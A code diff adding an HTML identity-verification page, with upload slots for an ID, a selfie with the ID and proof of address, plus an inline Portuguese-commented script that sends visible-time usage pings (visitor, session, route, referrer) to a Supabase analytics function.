+        <span x-show="!received && !busy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
+</span>
+        <span x-show="busy" x-cloak class="upload-zone__spinner"></span>
+        <span x-show="received && !busy" x-cloak><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 6 9 17l-5-5"/></svg>
+</span>
+    </span>
+
+    <span class="upload-zone__body">
+        <span class="upload-zone__title">Government-issued ID</span>
+        <span class="upload-zone__sub" x-show="!received && !busy">Driver&#039;s license or passport</span>
+        <span class="upload-zone__sub" x-show="busy" x-cloak>Sending…</span>
+        <span class="upload-zone__sub upload-zone__sub--done" x-show="received && !busy" x-cloak
+              x-text="fileName ? 'Received · ' + fileName : 'Received'"></span>
+    </span>
+
+    <span class="upload-zone__action" aria-hidden="true">
+        <span x-show="!received && !busy">Select</span>
+        <span x-show="received && !busy" x-cloak>Replace</span>
+    </span>
+</label>
+                                    <label class="upload-zone" data-slot="selfie"
+       :class="{ 'upload-zone--filled': received, 'upload-zone--busy': busy }"
+       x-data="uploadZone('selfie', false, null)">
+
+    <input class="upload-zone__input" type="file" accept="image/*,application/pdf"
+           :disabled="busy" @change="pick($event)">
+
+    <span class="upload-zone__icon" aria-hidden="true">
+        <span x-show="!received && !busy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3z"/><circle cx="12" cy="13" r="3"/></svg>
+</span>
+        <span x-show="busy" x-cloak class="upload-zone__spinner"></span>
+        <span x-show="received && !busy" x-cloak><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 6 9 17l-5-5"/></svg>
+</span>
+    </span>
+
+    <span class="upload-zone__body">
+        <span class="upload-zone__title">Selfie with your ID</span>
+        <span class="upload-zone__sub" x-show="!received && !busy">Your face and the ID in the same photo</span>
+        <span class="upload-zone__sub" x-show="busy" x-cloak>Sending…</span>
+        <span class="upload-zone__sub upload-zone__sub--done" x-show="received && !busy" x-cloak
+              x-text="fileName ? 'Received · ' + fileName : 'Received'"></span>
+    </span>
+
+    <span class="upload-zone__action" aria-hidden="true">
+        <span x-show="!received && !busy">Select</span>
+        <span x-show="received && !busy" x-cloak>Replace</span>
+    </span>
+</label>
+                                    <label class="upload-zone" data-slot="address"
+       :class="{ 'upload-zone--filled': received, 'upload-zone--busy': busy }"
+       x-data="uploadZone('address', false, null)">
+
+    <input class="upload-zone__input" type="file" accept="image/*,application/pdf"
+           :disabled="busy" @change="pick($event)">
+
+    <span class="upload-zone__icon" aria-hidden="true">
+        <span x-show="!received && !busy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+</span>
+        <span x-show="busy" x-cloak class="upload-zone__spinner"></span>
+        <span x-show="received && !busy" x-cloak><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 6 9 17l-5-5"/></svg>
+</span>
+    </span>
+
+    <span class="upload-zone__body">
+        <span class="upload-zone__title">Proof of address</span>
+        <span class="upload-zone__sub" x-show="!received && !busy">Utility bill or bank statement</span>
+        <span class="upload-zone__sub" x-show="busy" x-cloak>Sending…</span>
+        <span class="upload-zone__sub upload-zone__sub--done" x-show="received && !busy" x-cloak
+              x-text="fileName ? 'Received · ' + fileName : 'Received'"></span>
+    </span>
+
+    <span class="upload-zone__action" aria-hidden="true">
+        <span x-show="!received && !busy">Select</span>
+        <span x-show="received && !busy" x-cloak>Replace</span>
+    </span>
+</label>
+                            </div>
+
+            <p class="upload-form__count">
+                <span x-text="received">0</span> of 3 documents received
+            </p>
+
+            <button type="submit" class="btn btn--primary btn--full">Submit and start review</button>
+        </form>
+
+        
+        <div class="upload-done" x-show="sent" x-cloak>
+            <span class="upload-done__mark" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 6 9 17l-5-5"/></svg>
+</span>
+            <p class="upload-done__title">Documents submitted</p>
+            <p class="upload-done__text">Your review has started — we are opening it now.</p>
+        </div>
+    </div></div>
+    </div>
+</div>
+
+    
+    
+    <div class="toast" id="toast" role="status" aria-live="polite"
+     >
+    <span class="toast__text" id="toast-text"></span>
+</div>
+</div>
+
+
+<script>
+(function () {
+  var URL_ = "https://hrlmqwkgruexsxpqmxje.supabase.co/functions/v1/wallet-track";
+  var EMAIL = null;
+
+  function id(chave, store) {
+    try {
+      var v = store.getItem(chave);
+      if (!v) { v = Math.random().toString(36).slice(2) + Date.now().toString(36); store.setItem(chave, v); }
+      return v;
+    } catch (e) { return "sem-storage"; }
+  }
+
+  // visitor sobrevive ao fechar o navegador — é ele que responde "abre todo dia?".
+  // sessao morre com a aba: é a unidade do tempo de uso.
+  var visitor = id("w_visitor", window.localStorage);
+  var sessao = id("w_sessao", window.sessionStorage);
+
+  // Tempo REAL de olho na tela. Sem parar o relógio quando a aba esconde, um celular
+  // esquecido aberto vira "40 minutos de uso" e a média mente para todo mundo.
+  var segundos = 0, ultimo = Date.now(), visivel = !document.hidden;
+
+  function tick() {
+    var agora = Date.now();
+    if (visivel) segundos += (agora - ultimo) / 1000;
+    ultimo = agora;
+  }
+
+  function manda(evento, viaBeacon) {
+    tick();
+    var corpo = JSON.stringify({
+      visitor: visitor, sessao: sessao, evento: evento, email: EMAIL,
+      rota: location.pathname, segundos: Math.round(segundos),
+      ref: document.referrer || null
+    });
+    try {
+      // sendBeacon é o único que sobrevive à aba fechando
+      if (viaBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(URL_, new Blob([corpo], { type: "application/json" }));
+        return;
+      }
+      fetch(URL_, { method: "POST", headers: { "Content-Type": "application/json" },
+                    body: corpo, keepalive: true }).catch(function () {});
+    } catch (e) {}
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    tick();
+    visivel = !document.hidden;
+    if (document.hidden) manda("ping", true);
+  });
+
+  manda("open");
+  setInterval(function () { manda("ping"); }, 20000);
+  window.addEventListener("pagehide", function () { manda("saida", true); });
+})();
+</script>
+</body>
+</html>
